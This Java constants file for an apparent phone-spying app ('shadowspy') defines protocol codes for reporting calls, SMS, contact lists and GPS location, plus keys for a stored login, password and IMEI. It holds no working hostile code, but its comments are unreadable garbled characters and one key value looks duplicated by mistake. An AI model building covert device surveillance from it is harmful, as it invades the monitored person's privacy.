package com.example.shadowspy;

public class Codes {
	//���� �'�������
	public static String NO_CONNECT = "#0";
	
	//���� ���������
	public static String SUCCESS_REGISTRATION = "#20";
	public static String FAIL_REGISTRATION = "#21";	
	
	//���� �����������
	public static String SUCCESS_AUTHORIZATION = "#25";
	public static String BAD_LOGIN = "#27";		
	public static String BAD_PASSWORD = "#26";	
	
	//���� ������ �� �������
	public static String FAIL_LOGOUT = "#23";
	
	//���� �������� ����������
	public static String FAIL_SEND_MESSAGE = "#28";
	
	//���� �������
	public static String NEW_CALL = "#100";
	public static String START_INCOMING_CALL = "#101";
	public static String START_OUTCOMING_CALL = "#102";	
	public static String STOP_CALL = "#103";
	public static String NEW_SMS = "#110";
	public static String INCOME_SMS = "#111";
	public static String GET_CONTACT_LIST = "#112";
	
	//���� GPS
	public static String MY_LOCATION = "#120";
	
	//���� ��������� ����������
	public static String NEW_MSG = "#150";
	
	//����� �������� ��� ���������� �����������
	public static String file_pref = "preference";
	public static String saved_login = "login";
	public static String saved_pass = "pass";
	public static String saved_isPCOnline = "isPCOnline";
	public static String saved_isPDAOnline = "isPCOnline";
	public static String saved_isStartScreenShow = "isStartScreenShow";
	public static String saved_IMEI = "IMEI";
	public static String saved_time_to_refresh = "time_refresh";
	
	//���� ���������� StatusBar
	public static int CONNECTION_NOTIFY = 0x0001;
	public static int NEW_MESSAGE_NOTIFY = 0x6521;
}
